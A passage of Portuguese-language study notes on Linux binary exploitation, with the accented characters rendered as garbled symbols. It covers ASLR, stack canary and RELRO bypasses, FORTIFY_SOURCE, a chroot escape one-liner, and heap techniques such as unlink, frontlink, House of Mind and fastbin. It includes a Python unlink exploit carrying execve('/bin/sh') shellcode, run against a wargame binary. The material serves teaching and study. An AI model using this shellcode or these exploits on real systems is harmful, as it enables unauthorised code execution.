As bibliotecas est√£o em uma posi√ß√£o com 16bits de aleatoriedade = 65636 poss√≠veis endere√ßos. Se um servidor vulner√°vel chama a fork(), o espa√ßo de endere√ßamento de mem√≥ria √© clonado no processo filho e mantido intacto. Portanto, pode-se tentar fazer um brute force na fun√ß√£o usleep() da libc passando "16" como argumento de forma que, quando demorar mais do que o normal para responder, essa fun√ß√£o ter√° sido encontrada. Sabendo onde est√° essa fun√ß√£o, pode-se obter delta\_mmap e calcular os demais.

A √∫nica forma de ter certeza de que o ASLR funciona √© usando arquitetura de 64bits. L√° n√£o h√° ataques de for√ßa bruta.

**StackGuard e StackShield**

**StackGuard** insere antes do EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Ainda s√£o vulner√°veis recv(), memcpy(), read(), bcoy() e n√£o protege o EBP

**StackShield** √© mais elaborado que StackGuard

Guarda em uma tabela (Global Return Stack) todos os endere√ßos EIP de retorno de forma que o overflow n√£o cause nenhum dano. Al√©m disso, ambas as dire√ß√µes podem ser comparadas para ver se houve um desbordamento.

Tamb√©m se pode verificar o endere√ßo de retorno com um valor limite, assim se o EIP for para um local diferente do habitual, como o espa√ßo de dados, ser√° detectado. Mas isso √© contornado com Ret-to-lib, ROPs ou ret2ret.

Como se pode ver, stackshield tamb√©m n√£o protege as vari√°veis locais.

**Stack Smash Protector (ProPolice) -fstack-protector**

Coloca o can√°rio antes do EBP. Reorganiza as vari√°veis locais para que os buffers estejam nas posi√ß√µes mais altas e assim n√£o possam sobrescrever outras vari√°veis.

Al√©m disso, realiza uma c√≥pia segura dos argumentos passados acima da pilha (acima das vars locais) e usa essas c√≥pias como argumentos.

N√£o pode proteger arrays de menos de 8 elementos nem buffers que fa√ßam parte de uma estrutura do usu√°rio.

O can√°rio √© um n√∫mero aleat√≥rio tirado de ‚Äú/dev/urandom‚Äù ou sen√£o √© 0xff0a0000. √â armazenado em TLS (Thread Local Storage). Os threads compartilham o mesmo espa√ßo de mem√≥ria, o TLS √© uma √°rea que tem vari√°veis globais ou est√°ticas de cada thread. No entanto, em princ√≠pio, estas s√£o copiadas do processo pai, embora o processo filho possa modificar esses dados sem alterar os do pai ou dos outros filhos. O problema √© que se fork() √© usado mas n√£o se cria um novo can√°rio, ent√£o todos os processos (pai e filhos) usam o mesmo can√°rio. Em i386 √© armazenado em gs:0x14 e em x86\_64 √© armazenado em fs:0x28

Esta prote√ß√£o localiza fun√ß√µes que tenham buffer que possam ser atacados e inclui nelas c√≥digo no in√≠cio da fun√ß√£o para colocar o can√°rio e c√≥digo no final para verific√°-lo.

A fun√ß√£o fork() realiza uma c√≥pia exata do processo do pai, por isso mesmo se um servidor web chama a fork() pode-se fazer um ataque de for√ßa bruta byte por byte at√© descobrir o can√°rio que est√° sendo utilizado.

Se a fun√ß√£o execve() for usada ap√≥s fork(), o espa√ßo √© sobrescrito e o ataque j√° n√£o √© poss√≠vel. vfork() permite executar o processo filho sem criar um duplicado at√© que o processo filho tente escrever, ent√£o sim cria o duplicado.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** afeta as permiss√µes de mem√≥ria de forma semelhante ao NX. A diferen√ßa √© que enquanto o NX torna a pilha execut√°vel, o RELRO torna **certas coisas somente leitura** para que **n√£o possamos escrever** nelas. A maneira mais comum que vi isso ser um obst√°culo √© impedindo-nos de fazer uma **sobrescrita da tabela `got`**, que ser√° abordada mais tarde. A tabela `got` cont√©m endere√ßos para fun√ß√µes libc para que o bin√°rio saiba quais s√£o os endere√ßos e possa cham√°-los. Vamos ver como s√£o as permiss√µes de mem√≥ria para uma entrada da tabela `got` para um bin√°rio com e sem relro.

Com relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sem relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para o bin√°rio **sem relro**, podemos ver que o endere√ßo de entrada `got` para `fgets` √© `0x404018`. Olhando para os mapeamentos de mem√≥ria, vemos que ele est√° entre `0x404000` e `0x405000`, que tem as **permiss√µes `rw`**, significando que podemos ler e escrever nele. Para o bin√°rio **com relro**, vemos que o endere√ßo da tabela `got` para a execu√ß√£o do bin√°rio (pie est√° habilitado, ent√£o este endere√ßo mudar√°) √© `0x555555557fd0`. No mapeamento de mem√≥ria desse bin√°rio, ele est√° entre `0x0000555555557000` e `0x0000555555558000`, que tem a **permiss√£o de mem√≥ria `r`**, significando que s√≥ podemos ler dele.

Ent√£o, qual √© o **bypass**? O bypass t√≠pico que uso √© simplesmente n√£o escrever em regi√µes de mem√≥ria que o relro faz serem somente leitura e **encontrar uma maneira diferente de obter execu√ß√£o de c√≥digo**.

Note que, para que isso aconte√ßa, o bin√°rio precisa conhecer previamente os endere√ßos das fun√ß√µes:

* Lazy binding: O endere√ßo de uma fun√ß√£o √© procurado na primeira vez que a fun√ß√£o √© chamada. Assim, o GOT precisa ter permiss√µes de escrita durante a execu√ß√£o.
* Bind now: Os endere√ßos das fun√ß√µes s√£o resolvidos no in√≠cio da execu√ß√£o, depois permiss√µes somente leitura s√£o dadas a se√ß√µes sens√≠veis como .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`e`**`-z now\`\*\*

Para verificar se um programa usa Bind now, voc√™ pode fazer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
```markdown
Quando o bin√°rio √© carregado na mem√≥ria e uma fun√ß√£o √© chamada pela primeira vez, salta-se para a PLT (Procedure Linkage Table). Daqui, realiza-se um salto (jmp) para a GOT e descobre-se que essa entrada n√£o foi resolvida (cont√©m um endere√ßo seguinte da PLT). Assim, invoca-se o Runtime Linker ou rtfd para resolver o endere√ßo e guard√°-lo na GOT.

Quando se chama uma fun√ß√£o, chama-se a PLT, que tem o endere√ßo da GOT onde se armazena o endere√ßo da fun√ß√£o, redirecionando o fluxo para l√° e chamando a fun√ß√£o. No entanto, se √© a primeira vez que a fun√ß√£o √© chamada, o que est√° na GOT √© a instru√ß√£o seguinte da PLT, ent√£o o fluxo segue o c√≥digo da PLT (rtfd) para descobrir o endere√ßo da fun√ß√£o, guard√°-lo na GOT e cham√°-lo.

Ao carregar um bin√°rio na mem√≥ria, o compilador indica em que offset devem ser colocados dados que devem ser carregados quando o programa √© executado.

Lazy binding ‚Äî> O endere√ßo da fun√ß√£o √© procurado na primeira vez que a fun√ß√£o √© invocada, ent√£o a GOT tem permiss√µes de escrita para que, ao procurar, o endere√ßo seja guardado l√° e n√£o seja necess√°rio procurar novamente.

Bind now ‚Äî> Os endere√ßos das fun√ß√µes s√£o procurados ao carregar o programa e as permiss√µes das se√ß√µes .got, .dtors, .ctors, .dynamic, .jcr s√£o alteradas para somente leitura. **-z relro** e **-z now**

Apesar disso, geralmente os programas n√£o s√£o compilados com essas op√ß√µes, ent√£o esses ataques ainda s√£o poss√≠veis.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** ‚Äî> Para saber se usam o BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Tenta identificar fun√ß√µes que copiam de um local para outro de forma insegura e trocar a fun√ß√£o por uma segura.

Por exemplo:\
char buf[16];\
strcpy(but, source);

Identifica como insegura e ent√£o troca strcpy() por __strcpy_chk(), usando o tamanho do buffer como tamanho m√°ximo a copiar.

A diferen√ßa entre **=1** ou **=2** √© que:

A segunda n√£o permite que **%n** venha de uma se√ß√£o com permiss√µes de escrita. Al√©m disso, o par√¢metro para acesso direto de argumentos s√≥ pode ser usado se os anteriores forem usados, ou seja, s√≥ se pode usar **%3$d** se antes tiver usado **%2$d** e **%1$d**

Para mostrar a mensagem de erro, usa-se o argv[0], ent√£o se colocar no argv[0] o endere√ßo de outro local (como uma vari√°vel global), a mensagem de erro mostrar√° o conte√∫do dessa vari√°vel. P√°gina 191

**Substitui√ß√£o de Libsafe**

Ativa-se com: LD_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Intercepta chamadas a algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (s√≥ para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis s√£o seguradas e LD_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que se chame a fun√ß√£o strcpy@plt (da plt) e se aponte para a entrada da GOT e se copie o primeiro byte da fun√ß√£o que se quer chamar (system()). Em seguida, faz-se o mesmo apontando para GOT+1 e copia-se o segundo byte de system()... No final, chama-se o endere√ßo guardado na GOT que ser√° system()

**Falso EBP**

Para fun√ß√µes que usam o EBP como registro para apontar para os argumentos, ao modificar o EIP e apontar para system(), deve-se ter modificado o EBP tamb√©m para que aponte para uma √°rea de mem√≥ria que tenha 2 bytes quaisquer e depois o endere√ßo para &"/bin/sh".

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico sob um subdiret√≥rio espec√≠fico

Um admin pode sair de uma dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de c√≥digo**

Valgrind ‚Äî> Procura erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Tro√ßo atribu√≠do**

prev_size |\
size | ‚ÄîCabe√ßalho\
*mem | Dados

**Tro√ßo livre**

prev_size |\
size |\
*fd | Ponteiro para o pr√≥ximo tro√ßo\
*bk | Ponteiro para o tro√ßo anterior ‚ÄîCabe√ßalho\
*mem | Dados

Os tro√ßos livres est√£o numa lista duplamente ligada (bin) e nunca podem haver dois tro√ßos livres juntos (s√£o combinados).

No "size" h√° bits para indicar: Se o tro√ßo anterior est√° em uso, se o tro√ßo foi atribu√≠do atrav√©s de mmap() e se o tro√ßo pertence ao arena principal.

Se ao libertar um tro√ßo algum dos cont√≠guos estiver livre, eles s√£o combinados atrav√©s da macro unlink() e o novo tro√ßo maior √© passado para frontlink() para ser inserido no bin adequado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo tro√ßo √© o que tinha o tro√ßo livre anterior\
FD = P->fd; ‚Äî> O FD do novo tro√ßo √© o que tinha o tro√ßo livre anterior\
FD->bk = BK; ‚Äî> O BK do pr√≥ximo tro√ßo aponta para o novo tro√ßo\
BK->fd = FD; ‚Äî> O FD do tro√ßo anterior aponta para o novo tro√ßo\
}

Portanto, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

E assim, ao sair do programa, executa-se o shellcode.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e o shellcode tem que estar preparado para isso:

BK->fd = FD -> *(&shellcode + 8) = (&__dtor_end__ - 12) ‚Äî> Isso causa a escrita de 4 bytes a partir do 8¬∫ byte do shellcode, ent√£o a primeira instru√ß√£o do shellcode deve ser um jmp para saltar isso e cair em nops que levam ao resto do shellcode.

Portanto, o exploit √© criado:

No buffer1 colocamos o shellcode come√ßando com um jmp para que caia nos nops ou no resto do shellcode.

Depois do shellcode, colocamos preenchimento at√© chegar aos campos prev_size e size do pr√≥ximo tro√ßo. Nesses locais colocamos 0xfffffff0 (para sobrescrever o prev_size para que tenha o bit que diz que est√° livre) e "-4" (0xfffffffc) no size (para que, ao verificar no 3¬∫ tro√ßo se o 2¬∫ estava livre, na realidade v√° para o prev_size modificado que dir√° que est√° livre) -> Assim, quando free() investigar, ir√° para o size do 3¬∫ mas na realidade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ tro√ßo est√° livre. E ent√£o chamar√° **unlink()**.

Ao chamar unlink(), usar√° como P->fd os primeiros dados do 2¬∫ tro√ßo, ent√£o a√≠ colocaremos o endere√ßo que queremos sobrescrever - 12 (pois em FD->bk somar√° 12 ao endere√ßo guardado em FD). E nesse endere√ßo introduziremos a segunda dire√ß√£o que encontramos no 2¬∫ tro√ßo, que nos interessa que seja o endere√ßo para o shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I‚Äù, 0xfffffff0) #Interessa que o bit que indica que o tro√ßo anterior est√° livre esteja a 1**

**fake_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o ‚Äúsize‚Äù do 3¬∫ tro√ßo est√° 4bytes atr√°s (aponta para prev_size) pois √© a√≠ que verifica se o 2¬∫ tro√ßo est√° livre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #No payload no in√≠cio vamos colocar 8bytes de relleno**

**got_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° o endere√ßo que ser√° sobrescrito para que se lance o shellcode a 2¬™ vez que se chame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se disse, o payload come√ßa com 8 bytes de relleno porque sim**

**payload += prev_size + fake_size + got_free + addr_sc #Modifica-se o 2¬∫ tro√ßo, o got_free aponta para onde vamos guardar o endere√ßo addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos e s√£o liberados em ordem inversa √† reservada.

Nesse caso:

No chunk c colocamos o shellcode

O chunk a usamos para sobrescrever o b de forma que o size tenha o bit PREV_INUSE desativado para que pense que o chunk a est√° livre.

Al√©m disso, sobrescrevemos no cabe√ßalho b o size para que valha -4.

Ent√£o, o programa pensar√° que ‚Äúa‚Äù est√° livre e num bin, ent√£o chamar√° unlink() para desvincul√°-lo. No entanto, como o cabe√ßalho PREV_SIZE vale -4, pensar√° que o tro√ßo de ‚Äúa‚Äù realmente come√ßa em b+4. Ou seja, far√° um unlink() num tro√ßo que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro ‚Äúfd‚Äù e em b+16 estar√° o ponteiro ‚Äúbk‚Äù.

Dessa forma, se colocarmos no bk o endere√ßo do shellcode e no fd o endere√ßo da fun√ß√£o ‚Äúputs()‚Äù-12, temos nosso payload.

**T√©cnica de Frontlink**

Chama-se a frontlink quando se liberta algo e nenhum dos seus tro√ßos cont√≠guos √© livre, n√£o se chama a unlink() mas sim diretamente a frontlink().

Vulnerabilidade √∫til quando o malloc que se ataca nunca √© libertado (free()).

Necessita:

Um buffer que possa ser desbordado com a fun√ß√£o de entrada de dados

Um buffer cont√≠guo a este que deve ser libertado e ao qual se modificar√° o campo fd do seu cabe√ßalho gra√ßas ao desbordamento do buffer anterior

Um buffer a ser libertado com um tamanho maior a 512 mas menor que o buffer anterior

Um buffer declarado antes do passo 3 que permita sobrescrever o prev_size deste

Dessa forma, conseguindo sobrescrever em dois mallocs de forma descontrolada e num de forma controlada mas que s√≥ se liberta esse um, podemos fazer um exploit.

**Vulnerabilidade double free()**

Se se chama duas vezes a free() com o mesmo ponteiro, ficam dois bins apontando para o mesmo endere√ßo.

Caso se queira voltar a usar um, ser√° atribu√≠do sem problemas. Caso se queira usar outro, ser√° atribu√≠do o mesmo espa√ßo, ent√£o teremos os ponteiros ‚Äúfd‚Äù e ‚Äúbk‚Äù falseados com os dados que escrever√° a reserva anterior.

**After free()**

Um ponteiro previamente libertado √© usado de novo sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas de Unlink() e FrontLink() foram eliminadas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada a free() √© necess√°ria para provocar a execu√ß√£o de c√≥digo arbitr√°rio. Interessa procurar um segundo tro√ßo que possa ser desbordado por um anterior e libertado.

Uma chamada a free() provoca chamar a public_fREe(mem), este faz:

mstate ar_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devolve um ponteiro para o endere√ßo onde come√ßa o tro√ßo (mem-8)

‚Ä¶

ar_ptr = arena_for_chunk(p); ‚Äî> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena [1]

‚Ä¶

_int_free(ar_ptr, mem);

}

Em [1] verifica o campo size o bit NON_MAIN_ARENA, o qual se pode alterar para que a verifica√ß√£o devolva true e execute heap_for_ptr() que faz um and a ‚Äúmem‚Äù deixando a 0 os 2.5 bytes menos importantes (no nosso caso de 0x0804a000 deixa 0x08000000) e acede a 0x08000000->ar_ptr (como se fosse um struct heap_info)

Dessa forma, se podemos controlar um tro√ßo por exemplo em 0x0804a000 e vai-se libertar um tro√ßo em **0x081002a0** podemos chegar √† dire√ß√£o 0x08100000 e escrever o que quisermos, por exemplo **0x0804a000**. Quando este segundo tro√ßo se libertar, encontrar√° que heap_for_ptr(ptr)->ar_ptr devolve o que escrevemos em 0x08100000 (pois aplica-se a 0x081002a0 o and que vimos antes e da√≠ tira-se o valor dos 4 primeiros bytes, o ar_ptr)

Dessa forma, chama-se a _int_free(ar_ptr, mem), ou seja, **_int_free(0x0804a000, 0x081002a0)**\
**_int_free(mstate av, Void_t* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar o valor de av, pois √© o que escrevemos no tro√ßo que vai ser libertado.

Tal como se define unsorted_chunks, sabemos que:\
bck = &av->bins[2]-8;\
fwd = bck->fd = *(av->bins[2]);\
fwd->bk = *(av->bins[2] + 12) = p;

Portanto, se em av->bins[2] escrevermos o valor de __DTOR_END__-12 na √∫ltima instru√ß√£o, escrever-se-√° em __DTOR_END__ o endere√ßo do segundo tro√ßo.

Ou seja, no primeiro tro√ßo temos que colocar no in√≠cio muitas vezes o endere√ßo de __DTOR_END__-12 porque da√≠ tirar√° av->bins[2]

Na dire√ß√£o que caia o endere√ßo do segundo tro√ßo com os √∫ltimos 5 zeros temos que escrever o endere√ßo a este primeiro tro√ßo para que heap_for_ptr() pense que o ar_ptr est√° no in√≠cio do primeiro tro√ßo e tire da√≠ o av->bins[2]

No segundo tro√ßo e gra√ßas ao primeiro sobrescrevemos o prev_size com um jump 0x0c e o size com algo para ativar -> NON_MAIN_ARENA

A seguir no tro√ßo 2 colocamos muitos nops e finalmente o shellcode

Dessa forma, chamar-se-√° a _int_free(TROZO1, TROZO2) e seguir-se-√£o as instru√ß√µes para escrever em __DTOR_END__ o endere√ßo do prev_size do TROZO2 que saltar√° para o shellcode.

Para aplicar esta t√©cnica √© necess√°rio que se cumpram alguns requisitos mais que complicam um pouco mais o payload.

Esta t√©cnica j√° n√£o √© aplic√°vel pois aplicou-se quase o mesmo patch que para unlink. Comparam-se se o novo s√≠tio ao qual se aponta tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind

Interessa-nos chegar a executar o seguinte c√≥digo ao qual se chega passada a primeira verifica√ß√£o da fun√ß√£o _int_free()

fb = &(av->fastbins[fastbin_index(size)] ‚Äî> Sendo fastbin_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = *fb

*fb = p

Dessa forma, se se colocar em ‚Äúfb‚Äù a dire√ß√£o de uma fun√ß√£o na GOT, nessa dire√ß√£o colocar-se-√° a dire√ß√£o ao tro√ßo sobrescrito. Para isso ser√° necess√°rio que a arena esteja perto das dire√ß√µes de dtors. Mais exatamente que av->max_fast esteja na dire√ß√£o que
